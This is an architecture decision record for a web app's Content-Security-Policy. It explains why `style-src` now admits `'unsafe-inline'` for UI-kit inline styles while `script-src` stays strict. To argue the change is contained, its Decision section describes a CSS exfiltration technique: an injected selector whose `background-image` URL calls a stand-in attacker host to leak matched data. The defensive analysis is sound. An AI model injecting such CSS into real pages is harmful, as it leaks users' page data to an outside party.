# ADR-0072 — `style-src` admits `'unsafe-inline'`, because the UI kit writes `style` attributes

- **Date**: 2026-08-27
- **Status**: accepted

## Context

> Phase numbers below are the **front-end plan**'s (`docs/frontend-plan.md`), not
> `docs/BUILD-PLAN.md`'s; the two sequences are unrelated.

ADR-0064 froze a nine-clause policy for Phase 9.2 and stated, of the clauses it carried forward
from ADR-0049 untouched: "`style-src 'self'` still forbids the inline `style` attributes ADR-0025
already refuses to interpolate into". That sentence was true about the renderer it was written
against — `web/render/html.ts`, which escapes and never interpolates a `style` attribute. It was
never true about the SPA, and ADR-0064 and ADR-0062 were accepted on the same day: the ADR that
kept the clause and the ADR that chose the kit which violates it did not check each other.

**The evidence arrived only when Phase 9.6 ran the suite against the served build**, which is the
thing that phase exists for. In the dev topology the browser's origin is the Vite dev server, and
Vite sends no `Content-Security-Policy` header at all — so eight phases of e2e ran green against a
page that had no policy on it. The first run in the prod/demo topology, against Fastify serving
`apps/web/dist`, produced three console errors on the first page loaded:

```
Applying inline style violates the following Content Security Policy directive 'style-src 'self''.
```

Read off the built page rather than inferred, the sources are the kit ADR-0062 chose:

| Element                                      | Attribute written at render time                                                                                                                | Source              |
| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- |
| `TabsList`, its indicator span               | `pointer-events: none`                                                                                                                          | Radix UI Tabs       |
| `ScrollArea` root, viewport, its inner table | `--radix-scroll-area-corner-width: 0px`, `--radix-scroll-area-corner-height: 0px`, `overflow: hidden scroll`, `min-width: 100%; display: table` | Radix UI ScrollArea |
| The toast region                             | `animation-duration: 0s`, and an injected `<style>` sheet                                                                                       | `sonner`            |

It is not cosmetic. `shell.spec.ts`'s "a session that turns unknown mid-visit is purged, toasted,
and redirected" fails in the served topology: `sonner`'s stylesheet is blocked, so the toast that
tells a visitor their persona is gone never becomes visible. A state this repository calls a
deliverable rather than polish does not render in production.

## Decision

**`style-src` becomes `'self' 'unsafe-inline'`. Every other clause is unchanged, and
`script-src` stays `'self'`.** The frozen string, superseding ADR-0064's:

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self';
font-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'self';
frame-ancestors 'none'
```

Still one policy for every response, still `apps/api/src/web/reply.ts`'s `registerSecurityHeaders`
hook, still copied into exactly two places that must move together — that constant and
`routes.test.ts`'s literal assertion — which is the anti-drift arrangement ADR-0064 built and this
ADR inherits without change.

**What is actually given up is narrower than the keyword's name suggests, and the reason is the
clauses that did not move.** The realistic attack an inline style enables is CSS-based
exfiltration: an injected attribute selector whose `background-image: url(https://attacker/?leak)`
posts what it matched. `default-src 'none'` and `img-src 'self'` refuse that fetch, `connect-src
'self'` refuses its scripted equivalent, and `form-action 'self'` refuses the form-post version.
The channel is closed by three clauses that this ADR does not touch. What remains is defacement
inside the page's own origin by an attacker who already achieves markup injection — and markup
injection is refused a layer earlier, by ADR-0025's renderer, which escapes every interpolation.

**`script-src 'self'` is not affected and must not be.** That clause is ADR-0064's entire decision.
`routes.test.ts` now asserts it negatively — `CONTENT_SECURITY_POLICY` must not contain
`script-src 'self' 'unsafe-inline'` — so an edit that reaches for the same keyword one clause up
fails a test rather than passing review.

## Rejected option

**Keep `style-src 'self'` and drop the components that violate it.** This is the option that keeps
the ADR-0064 string intact, and it loses because the components are not decoration: Radix
primitives underpin every shadcn/ui component in the repository, and the kit is a decision of
record (ADR-0062, and the stack table of `docs/BUILD-RULES.md`, which says "do not substitute").
Rewriting Tabs, ScrollArea and the toaster by hand to keep one clause is a large amount of
untested UI code bought with a control whose exfiltration channel is already closed elsewhere.

**A nonce.** Rejected on a mechanism, not a preference: a `nonce` is an attribute of a `<style>`
**element**, and there is no way to nonce a `style` **attribute**. Radix writes attributes. A nonce
would admit `sonner`'s injected sheet and none of the six attribute cases above, so it does not
solve the problem it would be adopted for — and it would cost a per-response random value threaded
into `index.html`, which is a static build artefact this deployable serves with `sendFile`.

**`'unsafe-hashes'` with an enumerated hash list.** Rejected on the same kind of fact: the values
are computed per render (`--radix-scroll-area-corner-width` depends on measured layout), so the set
of hashes is not knowable at build time. Freezing today's three would break on the next viewport,
the next component, or the next dependency bump — a gate that passes because it stopped matching.

**Send a different policy to the SPA than to the printables.** Rejected already by ADR-0064 in the
same words, and the reason has not changed: two policies to test for a benefit that is nil here,
since the printables are the pages that need `style-src` least and would gain nothing from keeping
the stricter one.

## Reconsideration threshold

Reopen when either half of the mechanism changes: a UI kit that emits no runtime `style`
attributes (Radix removing them, or a replacement kit chosen under ADR-0062's own threshold), or a
CSP mechanism that can cover a style attribute — a nonce or hash form that applies to attributes
would make this keyword unnecessary and it should go the same day.

Reopen immediately, and this is the one that matters, if `'unsafe-inline'` is ever proposed for
`script-src`. That is not this decision extended; it is ADR-0064 reversed, and it needs its own
ADR arguing its own case.

## Consequences

**Easy.** The SPA renders as designed in the topology it actually ships in, and the toast that
tells a visitor their session is gone is visible again. `curl -I` still reports the policy in one
line, and the line still says the application runs exactly one self-hosted script and talks to
exactly one origin.

**Expensive.** The repository can no longer claim the strictest available `style-src`, and a
reader auditing the header sees a keyword whose name is alarming out of context — which is why the
containment argument is written above rather than left to be reconstructed. And the class of
regression that produced this ADR stays possible for any other header: a policy is only tested in
the topology that sends it, so the served-build e2e run of Phase 9.6 is now the only gate that
sees this header at all, and it has to keep running.
